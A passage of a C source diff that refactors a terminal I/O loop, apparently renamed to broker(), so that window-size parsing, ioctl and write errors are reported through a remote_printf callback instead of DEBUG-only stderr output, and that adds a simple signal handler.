-											program_invocation_short_name, listener, \
+									io->remote_printf(io, "%s: %d: strtol(%s): %s\r\n", \
+											program_invocation_short_name, io->listener, \
 											winsize_vec[0], strerror(errno));
-#endif
 									retval = -1;
 									goto CLEAN_UP;
 								}
 
 								if(winsize_vec[1] == NULL){
-#ifdef DEBUG
-									fprintf(stderr, \
+									io->remote_printf(io, \
 											"%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
-											program_invocation_short_name, listener);
-#endif
+											program_invocation_short_name, io->listener);
 									retval = -1;
 									goto CLEAN_UP;
 								}
@@ -1464,50 +1391,42 @@ int io_loop(int local_fd, int remote_fd, int listener){
 								errno = 0;
 								tty_winsize.ws_col = (short) strtol(winsize_vec[1], NULL, 10);
 								if(errno){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
-											program_invocation_short_name, listener, \
+									io->remote_printf(io, "%s: %d: strtol(%s): %s\r\n", \
+											program_invocation_short_name, io->listener, \
 											winsize_vec[1], strerror(errno));
-#endif
 									retval = -1;
 									goto CLEAN_UP;
 								}
 
-								if((retval = ioctl(local_fd, TIOCSWINSZ, &tty_winsize)) == -1){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, TIOCGWINSZ, (unsigned long) &tty_winsize, \
+								if((retval = ioctl(io->local_fd, TIOCSWINSZ, &tty_winsize)) == -1){
+									io->remote_printf(io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, TIOCGWINSZ, (unsigned long) &tty_winsize, \
 											strerror(errno));
-#endif
 									goto CLEAN_UP;
 								}
 
-								if((sig_pid = tcgetsid(local_fd)) == -1){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: tcgetsid(%d): %s\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, strerror(errno));
-#endif
+								if((sig_pid = tcgetsid(io->local_fd)) == -1){
+									io->remote_printf(io, "%s: %d: tcgetsid(%d): %s\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, strerror(errno));
 									retval = -1;
 									goto CLEAN_UP;
 								}
 
 								if((retval = kill(-sig_pid, SIGWINCH)) == -1){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: kill(%d, %d): %s\r\n", \
-											program_invocation_short_name, listener, \
+									io->remote_printf(io, "%s: %d: kill(%d, %d): %s\r\n", \
+											program_invocation_short_name, io->listener, \
 											-sig_pid, SIGWINCH, strerror(errno));
-#endif
 									goto CLEAN_UP;
 								}
 
 							}else{
 								// The winsize data is encoded as ascii. It should never come across at UTF8_HIGH.
 								// So this case will always be an error. Handle as such.
-								fprintf(stderr, \
-										"%s: %d: io_loop(): switch(%d): high closing byte found w/out low closing byte. Should not be here!\r\n", \
-										program_invocation_short_name, listener, state_counter);
+								io->remote_printf(io, \
+										"%s: %d: broker(): switch(%d): high closing byte found w/out low closing byte. Should not be here!\r\n", \
+										program_invocation_short_name, io->listener, state_counter);
 								retval = -1;
 								goto CLEAN_UP;
 							}
@@ -1517,9 +1436,9 @@ int io_loop(int local_fd, int remote_fd, int listener){
 						default:
 
 							// Handle error case.
-							fprintf(stderr, \
-									"%s: %d: io_loop(): switch(%d): unknown state. Should not be here!\r\n", \
-									program_invocation_short_name, listener, state_counter);
+							io->remote_printf(io, \
+									"%s: %d: broker(): switch(%d): unknown state. Should not be here!\r\n", \
+									program_invocation_short_name, io->listener, state_counter);
 							retval = -1;
 							goto CLEAN_UP;
 
@@ -1530,22 +1449,18 @@ int io_loop(int local_fd, int remote_fd, int listener){
 			}else{
 
 				// Don't forget to write output for the normal case!
-				if((retval = write(local_fd, buff_head, io_bytes)) == -1){
-#ifdef DEBUG
-					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-							program_invocation_short_name, listener, \
-							local_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
-#endif
+				if((retval = write(io->local_fd, buff_head, io_bytes)) == -1){
+					io->remote_printf(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
+							program_invocation_short_name, io->listener, \
+							io->local_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
 					goto CLEAN_UP;
 				}
 
 				if(retval != io_bytes){
-#ifdef DEBUG
-					fprintf(stderr, \
-							"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-							program_invocation_short_name, listener, \
-							local_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
-#endif
+					io->remote_printf(io, \
+							"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+							program_invocation_short_name, io->listener, \
+							io->local_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
 					retval = -1;
 					goto CLEAN_UP;
 				}
@@ -1553,13 +1468,30 @@ int io_loop(int local_fd, int remote_fd, int listener){
 			}
 		}
 	}
-#ifdef DEBUG
-	fprintf(stderr, "%s: %d: io_loop(): while(1): Shouldn't ever be here.\r\n", \
-			program_invocation_short_name, listener);
+	io->remote_printf(io, "%s: %d: broker(): while(1): Shouldn't ever be here.\r\n", \
+			program_invocation_short_name, io->listener);
 	retval = -1;
-#endif
 
 CLEAN_UP:
 	free(buff_head);
 	return(retval);
 }
+
+
+
+/*******************************************************************************
+ * 
+ * signal_handler()
+ *
+ * Input: The signal being handled.
+ * Output: None. 
+ * 
+ * Purpose: To handle signals! For best effort at avoiding race conditions,
+ *  we simply mark that the signal was found and return. This allows the
+ *  broker() select() call to manage signal generating events.
+ * 
+ ******************************************************************************/
+void signal_handler(int signal){
+	sig_found = signal;
+}
+
